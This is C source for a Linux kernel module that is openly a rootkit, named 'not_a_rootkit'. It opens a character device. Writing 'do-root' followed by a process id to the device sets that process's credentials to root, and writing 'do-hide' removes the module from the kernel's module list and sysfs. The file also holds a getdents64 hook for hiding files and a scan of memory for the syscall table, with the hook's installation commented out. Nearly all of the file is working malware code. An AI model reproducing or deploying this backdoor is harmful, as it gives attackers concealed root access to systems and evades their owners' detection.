/*
 *	simple kernel module
 */

#include <linux/module.h>		/* used by all modules */
#include <linux/kernel.h>		/* used by KERN_INFO and others */
#include <linux/init.h>			/* used for macros */
#include <linux/fs.h>			/* used for filesystem stuff */
#include <linux/uaccess.h>		/* required to include <asm/uaccess.h> */
#include <asm/uaccess.h>		/* handling data to userland buffers */
#include <linux/device.h>		/* class/device creation */
#include <linux/slab.h>			/* kernel memory allocation */
#include <linux/string.h>		/* string functions */
#include <linux/cred.h>			/* credential structures */
#include <linux/sched.h>		/* task and pid related operations */
#include <asm/current.h>		/* definition of 'current' (the current task) */

#include <asm/page.h>			/* definition of PAGE_OFFSET */
#include <uapi/asm/unistd.h>	/* syscall numbers */
#include <linux/dirent.h>		/* dirent struct */
#include <linux/kallsyms.h>		/* finding addresses of syscalls */

#include <../arch/x86/include/asm/paravirt.h>	/* for adjusting write protection */

#include <linux/gfp.h>			/* GFP defines */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("me");
MODULE_DESCRIPTION("simple module");
MODULE_VERSION("0.0.1");

/* prototypes */
static int __init trivial_init(void);
static void __exit trivial_exit(void);
static int trivial_open(struct inode *, struct file *);
static int trivial_close(struct inode *, struct file *);
static ssize_t trivial_write(struct file *, const char *, size_t, loff_t *);
static ssize_t trivial_read(struct file *, char *, size_t, loff_t *);
static struct task_struct *find_task_from_pid(int);
static void root_creds(struct cred *);
static void give_root(int);
static unsigned long *find_syscall_table (void);
static void hide_module(void);
static void unhide_module(void);

typedef asmlinkage long (*sys_getdents_t) (unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count);
sys_getdents_t sys_getdents_original = NULL;

/* useful defines */
#define DEVICE_NAME 		"not_a_rootkit"		// name appears in /proc/devices
#define CLASS_NAME 			"not_a"
#define SUCCESS				0
#define ASCIINUM_TO_DEC(x)	(x-48)				// conversion from ascii to decimal

#define WRITE_PROTECT_FLAG (1<<16)

/* globals (within this file) */
static int majorNum;					// device major number assigned
static int deviceOpen = 0;				// track if device open, may be useful later
static struct class *devClass = NULL;
static struct device *devStruct = NULL;

static unsigned long *syscall_table;

/* module hiding */
static int module_is_hidden = 0;
static struct list_head list_head_saved;
static struct module_kobject mkobj_saved;

/* used to store any data aquired, given back during a read()- needs to be allocated */
static char *devBuf = NULL;			

/* must declare file system operations that device can perform- see linux/fs.h */
static struct file_operations fops = {
	.read = trivial_read,
	.write = trivial_write,
	.open = trivial_open,
	.release = trivial_close
};

/* our new getdents function */
asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count) {

	/* run the original function, then remove any entries we want */
	long ret = sys_getdents_original(fd, dirent, count);
	if (ret <= 0) {
		return ret;
	}

	char *dir_ref = (char *)dirent;
	int offset = 0;
	while (offset < ret) {
		//char *entry_addr = dir_ref + offset;
		struct linux_dirent64 *cur_entry = (struct linux_dirent64 *)(dir_ref + offset);

		/* search for any occurance of our module */
		if (strstr(cur_entry->d_name, DEVICE_NAME) != NULL) {
			/* copy over the entry with all entries after it */
			//char *entry_end = dir_ref + offset + cur_entry->d_reclen;

			/* size to copy will be everything after this entry */
			//size_t len = ret - (offset + cur_entry->d_reclen);

			memcpy(dir_ref + offset, dir_ref + offset + cur_entry->d_reclen, ret - (offset + cur_entry->d_reclen));

			/* adjust length reported */
			ret -= cur_entry->d_reclen;
		} else {
			offset += cur_entry->d_reclen;
		}
		/* if we do remove an entry, offset will be pointing at new entry to examine */
	}

	return ret;
}


/*---------------- startup/shutdown ------------------------*/
/* function called on module initialisation */
static int __init trivial_init(void) {

	/* register our device with the kernel */
	majorNum = register_chrdev(0, DEVICE_NAME, &fops);

	if (majorNum < 0) {
		printk(KERN_ALERT "Failed to register rootkit chardevice\n");
		return majorNum;
	}
	
	/* register the device class */
	devClass = class_create(THIS_MODULE, CLASS_NAME);
	if (IS_ERR(devClass)) {
		unregister_chrdev(majorNum, DEVICE_NAME);
		printk(KERN_ALERT "Failed to register rootkit char class\n");
		return -1;		// tmp value
	}

	/* create the device */
	devStruct = device_create(devClass, NULL, MKDEV(majorNum, 0), NULL, DEVICE_NAME);
	if (IS_ERR(devStruct)) {
		class_destroy(devClass);
		unregister_chrdev(majorNum, DEVICE_NAME);
		printk(KERN_ALERT "Failed to create rootkit device\n");
		return -1;		// tmp value
	}

	/* get the syscall table in memory */
	syscall_table = find_syscall_table();
	if (syscall_table == NULL) {
		return -1;
	}

	/*
	sys_getdents_original = (sys_getdents_t) syscall_table[__NR_getdents64];
	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
	syscall_table[__NR_getdents64] = sys_getdents_new;
	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
	*/
		
	printk(KERN_INFO "Registered rootkit with the kernel. Thanks kernel\n");

	return 0;
}

/* function called on module removal, should reverse init function */
static void __exit trivial_exit(void) {
	
	/* restore our hooked functions 
	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
	syscall_table[__NR_getdents64] = sys_getdents_original;
	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
	*/
	/* unregister the device, cover our traces */
	device_destroy(devClass, MKDEV(majorNum, 0));
	class_unregister(devClass);
	class_destroy(devClass);
	unregister_chrdev(majorNum, DEVICE_NAME);
}

static int trivial_open(struct inode *inode, struct file *f) {
	printk(KERN_INFO "Inconspicuous device opened\n");
	return 0;
}

/* not sure if this is required, may have some use for this in future though */
static int trivial_close(struct inode *inode, struct file *f) {
	return 0;
}

/* 
 * called when a process writes to the device, used to execute specific commands 
 * expects the amount of bytes written returned
 */
static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_t *off) {
	//printk(KERN_INFO "Write performed to inconspicuous device\n");

	char *privBuf;				// our own buffer in kernel space
	char magic[] = "do-";		// magic prefix for all commands
	char *cmdPtr;				// track where in command statement we are later

	privBuf = (char *) kmalloc(len+1, GFP_KERNEL);	// allocate normal kernel RAM
	if (privBuf == NULL) {
		printk(KERN_INFO "ROOTKIT: failed to allocate kernel buffer");
		return len;
	}

	/* we are working with a user buffer, must copy into kernel space */
	copy_from_user(privBuf, buff, len);

	/* if the string starts with the magic prefix, we try to execute the command */
	if (memcmp(privBuf, magic, 3) == SUCCESS) {
		cmdPtr = &privBuf[3];			// cmdPtr should now be the given command

		/* case root access to a process- number after command indicates pidf */
		if (strncmp(cmdPtr, "root", 4) == SUCCESS) {

			cmdPtr = &cmdPtr[4]; 		// the beginning of the pid given
			if ((*cmdPtr) != '\0') {
				/* see man strtol for arguments */
				int pid = (int) simple_strtol(cmdPtr, NULL, 10);
				give_root(pid);
			}
		} else if (strncmp(cmdPtr, "hide", 4) == SUCCESS) {
			hide_module();
		} else if (strncmp(cmdPtr, "unhide", 6) == SUCCESS) {
			unhide_module();
		}
	}
	kfree(privBuf);		// leave no trace
	return len;
}

static void hide_module(void) {

	if (module_is_hidden) {
		return;
	}

	/* save states of structs */
	memcpy(&list_head_saved, &THIS_MODULE->list, sizeof(struct list_head));
	memcpy(&mkobj_saved, &THIS_MODULE->mkobj, sizeof(struct module_kobject));

	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	module_is_hidden = 1;
}

static void unhide_module(void) {

	if (!module_is_hidden) {
		return;
	}
	/* restore states of structs */
	memcpy(&THIS_MODULE->list, &list_head_saved, sizeof(struct list_head));
	memcpy(&THIS_MODULE->mkobj, &mkobj_saved, sizeof(struct module_kobject));
	module_is_hidden = 0;	
}

#define START_SEARCH PAGE_OFFSET
#define END_SEARCH ULONG_MAX
static unsigned long *find_syscall_table (void) {
	unsigned long i;
	unsigned long *syscall_table;
	unsigned long sys_open_addr = kallsyms_lookup_name("sys_open");
	for (i = START_SEARCH; i < END_SEARCH; i+= sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_open] == (unsigned long)sys_open_addr) {
			return syscall_table;
		}
	}
	return NULL;
}


/*
 * called when a process reads from the device, expects number of bytes read to be returned
 * maybe we give back custom data (say, from a command given to write()) in future
 */
static ssize_t trivial_read(struct file *f, char *buff, size_t length, loff_t *offset) {
	printk(KERN_INFO "Read performed on inconspicuous device\n");
	return 0;		// signal EOF for now
}

/* return the task struct associated with a given pid, or NULL on fail */
static struct task_struct *find_task_from_pid(int pid) {
	struct pid *task_pid;
	task_pid = find_vpid(pid);
	if (task_pid == NULL) {
		printk(KERN_INFO "Did not find pid struct from given pid\n");
		return NULL;
	}
	/* use the pid struct to find the task struct */
	struct task_struct *task = NULL;
	task = pid_task(task_pid, PIDTYPE_PID);
	return task;
}

/* change a given credential struct to root privileges */
static void root_creds(struct cred *c) {
	c->uid.val = 0;
	c->gid.val = 0;
	c->euid.val = 0;
	c->egid.val = 0;
	c->suid.val = 0;
	c->sgid.val = 0;
	c->fsuid.val = 0;
	c->fsgid.val = 0;
}

/* 
 * give root privileges to the process with given pid
 * a pid of 0 will give root to the current process 
 */
static void give_root(int pid) {
	struct task_struct *task;
	if (pid == 0) {
		task = current;
	} else {
		task = find_task_from_pid(pid);
		if (task == NULL) {
			return;
		}
	}
	root_creds(task->cred);
	root_creds(task->real_cred);
}
/*
static void hide_process(int pid) {
	struct pid *p = find_vpid(pid);
		if (task_pid == NULL) {
		printk(KERN_INFO "Did not find pid struct from given pid\n");
		return;
	}
	struct hidden_pid new;
	new.count = p->count;
	new.level = p->level;
	memcpy(&new.tasks, &p->tasks, sizeof(struct hlist_head * PIDTYPE_MAX));
	memcpy(&new.rcu, &p->rcu, sizeof(struct rcu));
	memcpy(&new.numbers, p->numbers, sizeof(struct upid));

	//zero out blocks in original pid, maybe make own function to do so 
}
*/
/* must call these and pass in our init/exit functions */
module_init(trivial_init);
module_exit(trivial_exit);